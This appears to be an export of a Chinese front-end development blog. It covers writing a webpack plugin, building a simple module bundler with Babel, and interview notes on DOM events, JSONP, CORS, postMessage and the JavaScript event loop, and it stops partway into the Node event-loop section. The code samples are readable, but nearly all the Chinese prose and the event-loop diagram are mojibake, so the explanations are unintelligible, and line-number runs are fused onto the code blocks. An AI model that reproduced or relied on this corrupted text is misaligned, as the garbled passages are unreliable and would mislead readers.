å¯ä»¥å…·ä½“å‚æ•°å¯ä»¥ç‚¹å‡»è¿™é‡Œ å¦‚ä½•ç¼–å†™ä¸€ä¸ª Pluginç®€å•çš„å®žçŽ° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// plugin/copyright-webpack-pluginclass CopyRightWebpackPlugin &#123; constructor(options) &#123; console.log(options) &#125; //compiler:webpack çš„å®žä¾‹ apply(compiler) &#123; // åŒæ­¥ compiler.hooks.compile.tap('CopyRightWebpackPlugin', (compilation) =&gt; &#123; console.log('compiler'); &#125;) // å¼‚æ­¥ compiler.hooks.emit.tapAsync('CopyRightWebpackPlugin', (compilation, cb) =&gt; &#123; debugger; compilation.assets['copyright.txt']=&#123; source:function()&#123; return 'copyright by hahaha' &#125;, size:function()&#123; return 19; &#125; &#125; cb(); &#125;) &#125;&#125;module.exports = CopyRightWebpackPlugin;// é…ç½® webpack.config.jsconst path = require('path');const CopyRightWebpackPlugin = require('./plugin/copyright-webpack-plugin.js');module.exports = &#123; mode: 'development', entry: &#123; 'main': './src/index.js' &#125;, plugins: [ new CopyRightWebpackPlugin(&#123; name:'haha' &#125;) ], output: &#123; filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; è°ƒè¯• 123456789101112131415161718&#123; "name": "plugin", "version": "1.0.0", "description": "", "main": "index.js", "scripts": &#123; "build": "webpack", "debug": "node --inspect --inspect-brk node_modules/webpack/bin/webpack.js", "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [], "author": "", "license": "ISC", "devDependencies": &#123; "webpack": "^4.30.0", "webpack-cli": "^3.3.0" &#125;&#125; npm run debug è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œæ·»åŠ  watch compilation å¯ä»¥å¯¹ä¸€äº›ç±»ä¼¼è¿™æ ·çš„å‚æ•°è¿›è¡Œè°ƒè¯•è§‚å¯Ÿ å…·ä½“çš„å¯ä»¥ç‚¹å‡»è¿™é‡Œ Bundler æºç ç¼–å†™ï¼ˆæ¨¡å—åˆ†æžï¼‰æ–‡ä»¶ç›®å½•src ä¸‹é¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ index.js message.js word.js ï¼Œå¼•ç”¨å…³ç³»æ˜¯ä»Žå·¦åˆ°å³å¯¼å…¥ä¸‹ä¸€ä¸ªçš„æ–‡ä»¶ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314// word.jsexport const word = 'hello'// message.jsimport &#123; word &#125; from './word.js'const message = `say $&#123;word&#125;`export default message; // index.jsimport message from './message.js'console.log(message); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// åŸºæœ¬é…ç½®const fs = require('fs');const path = require('path');const parser = require('@babel/parser');const traverse = require('@babel/traverse').default;const babel = require('@babel/core');// å…¥å£æ–‡ä»¶çš„åˆ†æžconst moduleAnalyser = (filename) =&gt; &#123; const content = fs.readFileSync(filename, 'utf-8'); // æŠ½è±¡è¯­æ³•æ ‘ const ast = parser.parse(content, &#123; sourceType: 'module' &#125;); // ä¾èµ–æ–‡ä»¶ï¼Œé”®å€¼å¯¹ï¼Œé”®ï¼šä¾èµ–æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œå€¼ï¼šä¾èµ–æ–‡ä»¶çš„ç›¸å¯¹äºŽbundler çš„è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„ï¼‰ const dependencies = &#123;&#125;; // åˆ†æžæŠ½è±¡è¯­æ³•æ ‘ traverse(ast, &#123; // å…¥å£å£°æ˜Ž ImportDeclaration(&#123; node &#125;) &#123; // è·¯å¾„è½¬æ¢ const dirname = path.dirname(filename); const newFile = './' + path.join(dirname, node.source.value) dependencies[node.source.value] = newFile &#125; &#125;) // æŠ½è±¡è¯­æ³•æ ‘çš„è½¬æ¢ï¼Œæå–å¯ä»¥åœ¨æµè§ˆå™¨è¿è¡Œçš„ä»£ç  const &#123; code &#125; = babel.transformFromAst(ast, null, &#123; // æ’ä»¶çš„é›†åˆ presets: ["@babel/preset-env"] &#125;) return &#123; filename, dependencies, code &#125;&#125;// ä¾èµ–å›¾è°±const makeDependenciesGraph = (entry) =&gt; &#123; const entryModule = moduleAnalyser(entry) const graphArray = [entryModule]; for (let i = 0; i &lt; graphArray.length; i++) &#123; const item = graphArray[i]; // èŽ·å–ä¾èµ–å…³ç³» const &#123; dependencies &#125; = item; if (dependencies) &#123; for (let j in dependencies) &#123; graphArray.push( moduleAnalyser(dependencies[j]) ) &#125; &#125; &#125; // æ ¼å¼è½¬æ¢ const graph = &#123;&#125; graphArray.forEach(item =&gt; &#123; graph[item.filename] = &#123; dependencies: item.dependencies, code: item.code &#125; &#125;) return graph;&#125;// ç”Ÿæˆæµè§ˆå™¨å¯ä»¥ç”¨çš„ä»£ç const generateCode = (entry) =&gt; &#123; // è½¬ä¸ºå­—ç¬¦ä¸² const graph = JSON.stringify(makeDependenciesGraph(entry)); // graph code é‡Œé¢æœ‰ exports è·Ÿ require çš„æ–¹æ³•,ä½†æ˜¯æµè§ˆå™¨æ²¡æœ‰è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±åŽ»å®žçŽ° console.log(graph); return ` (function (graph) &#123; function require(module) &#123; function localRequire(relativePath) &#123; return require(graph[module].dependencies[relativePath]) &#125; var exports = &#123;&#125;; (function (require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[module].code); return exports; &#125; require('$&#123;entry&#125;') &#125;)($&#123; graph&#125;) `;&#125;const Info = generateCode('./src/index.js');console.log(Info); è¿è¡Œ 1node bundler.js | highlight æŽ§åˆ¶å°è¾“å‡º 12345678910111213(function (graph) &#123; function require(module) &#123; // ./message.js é€šè¿‡ç›¸å¯¹è·¯å¾„æ¥æ‹¿åˆ°ç»å¯¹è·¯å¾„ function localRequire(relativePath) &#123; return require(graph[module].dependencies[relativePath]) &#125; var exports = &#123;&#125;; (function (require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[module].code); return exports; &#125; require('./src/index.js')&#125;)(&#123;"./src/index.js":&#123;"dependencies":&#123;"./message.js":"./src\\message.js"&#125;,"code":"\"use strict\";\n\nvar _message = _interopRequireDefault(require(\"./message.js\"));\n\nfunction _interopRequireDefault(obj) &#123; return obj &amp;&amp; obj.__esModule ? obj : &#123; \"default\": obj &#125;; &#125;\n\nconsole.log(_message[\"default\"]);"&#125;,"./src\\message.js":&#123;"dependencies":&#123;"./word.js":"./src\\word.js"&#125;,"code":"\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports[\"default\"] = void 0;\n\nvar _word = require(\"./word.js\");\n\nvar message = \"say \".concat(_word.word);\nvar _default = message;\nexports[\"default\"] = _default;"&#125;,"./src\\word.js":&#123;"dependencies":&#123;&#125;,"code":"\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports.word = void 0;\nvar word = 'hello';\nexports.word = word;"&#125;&#125;) å¤åˆ¶ç²˜è´´åˆ°æµè§ˆå™¨ä¾¿å¯ä»¥è¿è¡Œ graph è¾“å‡ºå†…å®¹æ˜¯ 123456789101112131415161718&#123; "./src/index.js": &#123; "dependencies": &#123; "./message.js": "./src\\message.js" &#125;, "code": "\"use strict\";\n\nvar _message = _interopRequireDefault(require(\"./message.js\"));\n\nfunction _interopRequireDefault(obj) &#123; return obj &amp;&amp; obj.__esModule ? obj : &#123; \"default\": obj &#125;; &#125;\n\nconsole.log(_message[\"default\"]);" &#125;, "./src\\message.js": &#123; "dependencies": &#123; "./word.js": "./src\\word.js" &#125;, "code": "\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports[\"default\"] = void 0;\n\nvar _word = require(\"./word.js\");\n\nvar message = \"say \".concat(_word.word);\nvar _default = message;\nexports[\"default\"] = _default;" &#125;, "./src\\word.js": &#123; "dependencies": &#123;&#125;, "code": "\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports.word = void 0;\nvar word = 'hello';\nexports.word = word;" &#125;&#125; å¯ä»¥çœ‹åˆ° code é‡Œé¢çš„å†…å®¹æœ‰ä¸€ä¸ªrequire å‡½æ•°å’Œä¸€ä¸ª exports å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ºäº†è¿™äº›ä»£ç èƒ½å¤Ÿåœ¨æµè§ˆå™¨è¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±åˆ›å»ºä¸€ä¸ª requireå‡½æ•°å’Œexports ç©ºå¯¹è±¡ã€‚]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆæµè§ˆå™¨ä¸Žæ€§èƒ½åŸºç¡€ç¯‡ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€.ç»­ å‰ç«¯é¢è¯•ä¹‹é“ç»§ç»­å¤ä¹ æµè§ˆå™¨ç›¸å…³å†…å®¹ æµè§ˆå™¨åŸºç¡€äº‹ä»¶æœºåˆ¶äº‹ä»¶è§¦å‘ä¸‰é˜¶æ®µ window å¾€äº‹ä»¶ è§¦å‘å¤„ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„æ•èŽ·äº‹ä»¶ä¼šè§¦å‘ ä¼ æ’­åˆ°äº‹ä»¶è§¦å‘å¤„æ—¶è§¦å‘æ³¨å†Œçš„äº‹ä»¶ ä»Žäº‹ä»¶è§¦å‘å¤„å¾€ window ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„å†’æ³¡äº‹ä»¶ä¼šè§¦å‘ äº‹ä»¶è§¦å‘ä¸€èˆ¬æ¥è¯´ä¼šæŒ‰ç…§ä¸Šé¢çš„é¡ºåºè¿›è¡Œï¼Œä½†æ˜¯ä¹Ÿæœ‰ç‰¹ä¾‹ï¼Œå¦‚æžœç»™ä¸€ä¸ªç›®æ ‡èŠ‚ç‚¹åŒæ—¶æ³¨å†Œå†’æ³¡å’Œæ•èŽ·äº‹ä»¶ï¼Œäº‹ä»¶è§¦å‘ä¼šæŒ‰ç…§æ³¨å†Œçš„é¡ºåºæ‰§è¡Œã€‚ 12345678910111213141516// ä¸‹é¢ä¼šå…ˆæ‰“å°å†’æ³¡ç„¶åŽæ•èŽ·node.addEventListener( 'click', event =&gt;&#123; console.log('å†’æ³¡'); &#125;, false)node.addEventListener( 'click', event =&gt;&#123; console.log('æ•èŽ·'); &#125;, true ) æ³¨å†Œäº‹ä»¶addEventListener æ³¨å†Œäº‹ä»¶ï¼Œæ”¹å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥æ˜¯å¸ƒå°”å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ã€‚å¯¹äºŽå¸ƒå°”å€¼ useCapture å‚æ•°æ¥è¯´ï¼Œè¯¥å‚æ•°é»˜è®¤å€¼ä¸º falseã€‚useCapture å†³å®šäº†æ³¨å†Œçš„äº‹ä»¶æ˜¯æ•èŽ·äº‹ä»¶è¿˜æ˜¯å†’æ³¡äº‹ä»¶ã€‚å¯¹äºŽå¯¹è±¡å‚æ•°æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢å‡ ä¸ªå±žæ€§ï¼š capture ï¼Œå¸ƒå°”å€¼ï¼Œå’Œ useCapture ä½œç”¨ä¸€æ · once,å¸ƒå°”å€¼ï¼Œå€¼ä¸º true è¡¨ç¤ºè¯¥å›žè°ƒå€¼è°ƒç”¨ä¸€æ¬¡ï¼Œè°ƒç”¨åŽä¼šç§»é™¤ç›‘å¬ passiveï¼Œå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ°¸è¿œä¸ä¼šè°ƒç”¨ preventDefault å¦‚æžœæˆ‘ä»¬å¸Œæœ›äº‹ä»¶åªè§¦å‘åœ¨ç›®æ ‡ä¸Šï¼Œå¯ä»¥è°ƒç”¨ stopPropagation æ¥é˜»æ­¢äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ã€‚é€šå¸¸æˆ‘ä»¬è®¤ä¸º stopPropagation æ˜¯ç”¨æ¥é˜»æ­¢äº‹ä»¶å†’æ³¡çš„ï¼Œå…¶å®žè¯¥å‡½æ•°ä¹Ÿå¯ä»¥é˜»æ­¢æ•èŽ·äº‹ä»¶ã€‚stopImmediatePropagation åŒæ ·ä¹Ÿå¯ä»¥å®žçŽ°é˜»æ­¢äº‹ä»¶ï¼Œä½†æ˜¯è¿˜èƒ½é˜»æ­¢è¯¥äº‹ä»¶ç›®æ ‡æ‰§è¡Œåˆ«çš„æ³¨å†Œäº‹ä»¶ã€‚ 12345678910111213141516node.addEventListener( 'click', event =&gt;&#123; event.stopImmediatePropagation() console.log('å†’æ³¡'); &#125;, false);// ç‚¹å‡» node åªä¼šæ‰§è¡Œä¸Šé¢çš„å‡½æ•°ï¼Œä¸‹é¢çš„ä¸ä¼šæ‰§è¡Œnode.addEventListener( 'click', event =&gt;&#123; console.log('æ•èŽ·'); &#125;, true) äº‹ä»¶ä»£ç†å¦‚æžœä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„å­èŠ‚ç‚¹æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹éœ€è¦æ³¨å†Œäº‹ä»¶çš„è¯åº”è¯¥æ³¨å†Œåœ¨çˆ¶èŠ‚ç‚¹ä¸Šé¢ 12345678910111213&lt;ul id="ul"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',event=&gt;&#123; console.log(event.target); &#125;);&lt;/script&gt; äº‹ä»¶ä»£ç†çš„æ–¹æ³•ç›¸å¯¹äºŽç›´æŽ¥ç»™ç›®æ ‡æ³¨å†Œäº‹ä»¶æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š èŠ‚çœå†…å­˜ ä¸éœ€è¦ç»™å­èŠ‚ç‚¹æ³¨é”€äº‹ä»¶ è·¨åŸŸJSONPJSONP åŽŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ©ç”¨ &lt;script&gt; æ ‡ç­¾æ²¡æœ‰è·¨åŸŸé™åˆ¶çš„æ¼æ´žã€‚é€šè¿‡ &lt;script&gt; æ ‡ç­¾æŒ‡å‘ä¸€ä¸ªéœ€è¦è®¿é—®çš„åœ°å€å¹¶æä¾›ä¸€ä¸ªå›žè°ƒå‡½æ•°æ¥æŽ¥æ”¶æ•°æ®å½“éœ€è¦é€šè®¯çš„æ—¶å€™ 123456&lt;script src="http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp"&gt;&lt;/script&gt;&lt;script&gt; function jsonp(data)&#123; console.log(data) &#125;&lt;/script&gt; JSONP ä½¿ç”¨ç®€å•ä¸”å…¼å®¹æ€§ä¸é”™ï¼Œä½†æ˜¯åªé™äºŽ get è¯·æ±‚ åœ¨å¼€å‘ä¸­å¯èƒ½ä¼šé‡åˆ°å¤šä¸ª JSONP è¯·æ±‚çš„å›žè°ƒå‡½æ•°åæ˜¯ç›¸åŒçš„ï¼Œè¿™æ—¶å€™å°±éœ€è¦è‡ªå·±å°è£…ä¸€ä¸ª JSONP ï¼Œä¸‹é¢æ˜¯ç®€å•çš„å®žçŽ°ï¼š 12345678910111213function jsonp(url,jsonpCallback,success)&#123; let script = document.createElement('script'); script.src = url; script.async = true; script.type = 'text/javascript' window[jsonpCallback] = function(data)&#123; success &amp;&amp; success(data) &#125; document.body.appendChild(script);&#125;jsonp('http://xxx','callback',function(value)&#123; console.log(value);&#125;); CORSCORS éœ€è¦æµè§ˆå™¨å’ŒåŽç«¯åŒæ—¶æ”¯æŒï¼ŒIE8 å’Œ 9 éœ€è¦é€šè¿‡ XDomainRequest æ¥å®žçŽ° æµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œ CORS é€šä¿¡ï¼Œå®žçŽ° CORS é€šä¿¡çš„å…³é”®æ˜¯åŽç«¯ï¼Œåªè¦åŽç«¯å®žçŽ°äº† CORS å°±å®žçŽ°äº†è·¨åŸŸã€‚ æœåŠ¡ç«¯è®¾ç½®äº† Access-Control-Allow-Origin å°±å¯ä»¥å¼€å¯ CORS ,è¯¥å±žæ€§è¡¨ç¤ºå“ªäº›åŸŸåå¯ä»¥è®¿é—®èµ„æºï¼Œå¦‚æžœè®¾ç½®é€šé…ç¬¦åˆ™è¡¨ç¤ºæ‰€æœ‰ç½‘ç«™éƒ½æ˜¯å¯ä»¥è®¿é—®èµ„æºçš„ã€‚ ä¼šåœ¨å‘é€è¯·æ±‚æ—¶å‡ºçŽ°ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«ä¸ºç®€å•è¯·æ±‚å’Œå¤æ‚è¯·æ±‚ ç®€å•è¯·æ±‚ ä»¥Ajax ä¸ºä¾‹ï¼Œå½“æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶çš„æ—¶å€™ä¼šè§¦å‘ç®€å•è¯·æ±‚ 1.ä½¿ç”¨ Get,HEAD,POST 2.Content-type çš„å€¼ä»…é™ text/plain,multipart/form-data,application/x-www-form-urlencoded ä¹‹ä¸€ è¯·æ±‚ä¸­çš„ä»»æ„ XMLHttpRequestUpload å¯¹è±¡å‡æ²¡æœ‰æ³¨å†Œä»»ä½•äº‹ä»¶ç›‘å¬å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ XMLHttpRequest.upload å±žæ€§è®¿é—® å¤æ‚è¯·æ±‚ å¯¹äºŽå¤æ‚çš„è¯·æ±‚ï¼Œé¦–å…ˆä¼šå‘èµ·ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼Œè¯¥è¯·æ±‚æ˜¯ option æ–¹æ³•ï¼Œé€šè¿‡è¯¥è¯·æ±‚æ¥æŒ‡ç‚¹æœåŠ¡ç«¯æ˜¯å¦è¿è¡Œè·¨åŸŸè¯·æ±‚ã€‚ å¯¹äºŽé¢„æ£€è¯·æ±‚ï¼Œä½¿ç”¨ Node æ¥è®¾ç½® CORS çš„è¯ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªå‘ï¼Œä»¥ express ä¸ºä¾‹ 123456app.use((req,res,next)=&gt;&#123; res.header('Access-Control-Allow-Origin','*') res.header('Access-Control-Allow-Methods','PUT,POST,GET,DELETE,OPTIONS') res.header('Access-Control-Allow-headers','Origin,X-Requested-With,Content-Type,Accept,Authorization,Access-Control-Allow-Credentials') next()&#125;) ä¸Šé¢çš„è¿™ä¸ªä»£ç ä¼šéªŒè¯ Authorization å­æ®µï¼Œå¦‚æžœæ²¡æœ‰è¯çš„å°±ä¼šæŠ¥é”™ å½“å‰ç«¯å‘èµ·äº†å¤æ‚è¯·æ±‚ï¼Œè¿”å›žçš„ç»“æžœæ°¸è¿œæ˜¯æŠ¥é”™çš„ã€‚å› ä¸ºé¢„æ£€è¯·æ±‚ä¹Ÿä¼šè¿›å…¥åˆ°å›žè°ƒä¸­ï¼Œä¹Ÿä¼šè§¦å‘ next æ–¹æ³•ï¼Œå› ä¸ºé¢„æ£€è¯·æ±‚å¹¶ä¸åŒ…å« Authorization å­å¼¹ï¼Œæ‰€ä»¥æœåŠ¡ç«¯ä¹Ÿä¼šæŠ¥é”™ã€‚æƒ³è¦è§£å†³è¿™ä¸ªé—®é¢˜å¾ˆç®€å•ï¼Œåªè¦åœ¨ å›žè°ƒä¸­è¿‡æ»¤æŽ‰ option å°±å¯ä»¥äº† 123res.statusCode = 204;res.setHeader('Content-Length','0');res.send(); document.domainè¯¥æ–¹å¼åªèƒ½ç”¨äºŽäºŒçº§åŸŸåç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚ a.test.com å’Œ b.test.com é€‚ç”¨äºŽè¯¥æ–¹å¼ã€‚ åªéœ€è¦ç»™é¡µé¢æ·»åŠ  document.domian = â€˜test.comâ€™ è¡¨ç¤ºäºŒçº§åŸŸåéƒ½ç›¸åŒå°±å¯ä»¥å®žçŽ°è·¨åŸŸ postMessageè¿™ç§æ–¹å¼é€šå¸¸ç”¨äºŽèŽ·å–åµŒå…¥é¡µé¢ä¸­çš„ç¬¬ä¸‰æ–¹é¡µé¢æ•°æ®ï¼Œä¸€ä¸ªé¡µé¢å‘é€æ¶ˆæ¯ï¼Œå¦ä¸€ä¸ªé¡µé¢åˆ¤æ–­æ¥æºå¹¶æŽ¥å—æ¶ˆæ¯ 12345678910// å‘é€æ¶ˆæ¯ç«¯window.parent.postMessage('message','http://test.com');// æŽ¥å—æ¶ˆæ¯ç«¯const mc = new MessageChannel();mc.addEventListener('message',event=&gt;&#123; const origin = event.origin || event.originalEvent.origin; if(origin === 'http://test.com')&#123; console.log('éªŒè¯é€šè¿‡'); &#125;&#125;) Event loopJS æ˜¯é—¨éžé˜»å¡žå•çº¿ç¨‹è¯­è¨€ JS åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šäº§ç”Ÿæ‰§è¡ŒçŽ¯å¢ƒï¼Œè¿™äº›æ‰§è¡ŒçŽ¯å¢ƒä¼šè¢«é¡ºåºçš„åŠ å…¥åˆ°æ‰§è¡Œæ ˆä¸­ã€‚å¦‚æžœé‡åˆ°å¼‚æ­¥çš„ä»£ç ï¼Œä¼šè¢«æŒ‚èµ·å¹¶åŠ å…¥åˆ° Task(æœ‰å¤šç§ task) é˜Ÿåˆ—ä¸­ã€‚ä¸€æ—¦æ‰§è¡Œæ ˆä¸ºç©ºï¼ŒEvent Loop å°±ä¼šä»Ž Task é˜Ÿåˆ—ä¸­æ‹¿å‡ºéœ€è¦æ‰§è¡Œçš„ä»£ç å¹¶æ”¾å…¥æ‰§è¡Œæ ˆä¸­æ‰§è¡Œï¼Œæ‰€ä»¥æœ¬è´¨ä¸Šæ¥è¯´ JS ä¸­çš„å¼‚æ­¥è¿˜æ˜¯åŒæ­¥è¡Œä¸ºã€‚ 12345678console.log('script start');setTimeout(function()&#123; console.log('setTimeout');&#125;,0);console.log('script end');// script start// script end// setTimeout ä»¥ä¸Šä»£ç è™½ç„¶ setTimeout å»¶æ—¶ä¸º 0ï¼Œå…¶å®žè¿˜æ˜¯å¼‚æ­¥ã€‚è¿™æ˜¯å› ä¸º HTML5 æ ‡å‡†è§„å®šè¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸å¾—å°äºŽ 4 æ¯«ç§’ï¼Œä¸è¶³ä¼šè‡ªåŠ¨å¢žåŠ ã€‚æ‰€ä»¥ setTimeout è¿˜æ˜¯ä¼šåœ¨ script end ä¹‹åŽæ‰“å°ã€‚ ä¸åŒçš„ä»»åŠ¡æºä¼šè¢«åˆ†é…åˆ°ä¸åŒçš„ Task é˜Ÿåˆ—ä¸­ï¼Œä»»åŠ¡æºå¯ä»¥åˆ†ä¸º å¾®ä»»åŠ¡ï¼ˆmicrotaskï¼‰ å’Œ å®ä»»åŠ¡ï¼ˆmacrotaskï¼‰ã€‚åœ¨ ES6 è§„èŒƒä¸­ï¼Œmicrotask ç§°ä¸º jobsï¼Œmacrotask ç§°ä¸º taskã€‚ 123456789101112131415161718192021222324console.log('script start')setTimeout(function() &#123; console.log('setTimeout')&#125;, 0)new Promise(resolve =&gt; &#123; console.log('Promise') resolve()&#125;) .then(function() &#123; console.log('promise1') &#125;) .then(function() &#123; console.log('promise2') &#125;)console.log('script end')// script start// Promise// script end// promise1// promise2// setTimeout å¾®ä»»åŠ¡åŒ…æ‹¬ process.nextTick ï¼Œpromise ï¼ŒObject.observe ï¼ŒMutationObserver å®ä»»åŠ¡åŒ…æ‹¬ script ï¼Œ setTimeout ï¼ŒsetInterval ï¼ŒsetImmediate ï¼ŒI/O ï¼ŒUI rendering å®ä»»åŠ¡ä¸­åŒ…æ‹¬äº† script ï¼Œæµè§ˆå™¨ä¼šå…ˆæ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡ï¼ŒæŽ¥ä¸‹æ¥æœ‰å¼‚æ­¥ä»£ç çš„è¯å°±å…ˆæ‰§è¡Œå¾®ä»»åŠ¡ã€‚ æ­£ç¡®çš„ä¸€æ¬¡ Event Loop é¡ºåºæ˜¯è¿™æ ·çš„ æ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œå±žäºŽå®è§‚ä»»åŠ¡ æ‰§è¡Œæ ˆä¸ºç©ºï¼ŒæŸ¥è¯¢æ˜¯å¦æœ‰å¾®ä»»åŠ¡éœ€è¦æ‰§è¡Œ æ‰§è¡Œæ‰€æœ‰å¾®ä»»åŠ¡ å¿…è¦çš„è¯æ¸²æŸ“ UI ç„¶åŽå¼€å§‹ä¸‹ä¸€è½® Event Loop ï¼Œæ‰§è¡Œå®ä»»åŠ¡ä¸­çš„å¼‚æ­¥ä»£ç  å¦‚æžœå®ä»»åŠ¡ä¸­çš„å¼‚æ­¥ä»£ç æœ‰å¤§é‡çš„è®¡ç®—å¹¶ä¸”éœ€è¦æ“ä½œ DOM çš„è¯ï¼Œä¸ºäº†æ›´å¿«çš„ç•Œé¢å“åº”ï¼Œå¯ä»¥æŠŠæ“ä½œ DOM æ”¾å…¥ å¾®ä»»åŠ¡ä¸­ã€‚ Node çš„ Event loopNode ä¸­çš„ Event loop å’Œæµè§ˆå™¨çš„ä¸ç›¸åŒ Node ä¸­çš„ Event loop åˆ†æˆäº†6ä¸ªé˜¶æ®µï¼Œå®ƒä»¬ä¼šæŒ‰ç…§é¡ºåºåå¤æ‰§è¡Œ 123456789101112131415161718â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€&gt;â”‚ timers â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚ I/O callbacks â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚ idle, prepare â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ incoming: â”‚â”‚ â”‚ poll â”‚&lt;â”€â”€connectionsâ”€â”€â”€ â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ data, etc. â”‚â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚ check â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â””â”€â”€â”¤ close callbacks â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ timertimer é˜¶æ®µä¼šæ‰§è¡Œ setTimeout å’Œ setInterval ä¸€ä¸ª timer æŒ‡å®šçš„æ—¶é—´å¹¶ä¸æ˜¯å‡†ç¡®çš„æ—¶é—´ï¼Œè€Œæ˜¯è¾¾åˆ°è¿™ä¸ªäº‹ä»¶åŽå°½å¿«æ‰§è¡Œå›žè°ƒï¼Œå¯èƒ½ä¼šå› ä¸ºç³»ç»Ÿæ­£åœ¨æ‰§è¡Œåˆ«çš„äº‹åŠ¡è€Œå»¶è¿Ÿ ä¸‹é™çš„æ—¶é—´æœ‰ä¸€ä¸ªèŒƒå›´ï¼š[1,2147483647]ï¼Œå¦‚æžœè®¾ç½®çš„æ—¶é—´ä¸åœ¨èŒƒå›´å†…ï¼Œå°†è¢«è®¾ç½®ä¸º 1. I/OI/O 